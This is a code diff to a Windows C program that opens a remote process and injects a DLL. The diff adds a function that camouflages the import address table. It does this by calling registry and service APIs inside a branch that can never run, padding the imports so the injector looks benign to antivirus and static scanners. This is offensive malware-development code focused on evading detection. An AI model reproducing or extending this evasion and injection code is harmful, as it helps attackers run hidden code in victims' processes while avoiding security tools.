@@ -2,6 +2,33 @@
 #include <Windows.h>
 #include <tlhelp32.h>
 
+// Function to add Whitelisted APIs to camouflage IAT
+VOID IATCamoflage2() {
+	ULONG_PTR uAddress = NULL;
+
+	if (!(uAddress = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0x100))) {
+		return;
+	}
+
+	if (((uAddress >> 8) & 0xFF) > 0xFFFF) {
+		RegCloseKey(NULL);
+		RegDeleteKeyExA(NULL, NULL, NULL, NULL);
+		RegDeleteKeyExW(NULL, NULL, NULL, NULL);
+		RegEnumKeyExA(NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
+		RegEnumKeyExW(NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
+		RegEnumValueW(NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
+		RegEnumValueA(NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
+		RegGetValueA(NULL, NULL, NULL, NULL, NULL, NULL, NULL);
+		RegGetValueW(NULL, NULL, NULL, NULL, NULL, NULL, NULL);
+		RegisterServiceCtrlHandlerA(NULL, NULL);
+		RegisterServiceCtrlHandlerW(NULL, NULL);
+	}
+
+	if (!HeapFree(GetProcessHeap(), 0x00, uAddress)) {
+		return;
+	}
+}
+
 // Function to enumerate processes and get the handle of the remote process
 BOOL GetRemoteProcessHandle(IN LPWSTR szProcessName, OUT DWORD* dwProcessID, OUT HANDLE* hProcess) {
 
@@ -160,6 +187,9 @@ int main() {
 	}
 
 	printf("[+] DLL injected successfully\n");
+
+	// Camoflage the IAT
+	IATCamoflage2();
 
 	// Close the handle to the process
 	CloseHandle(hProcess);
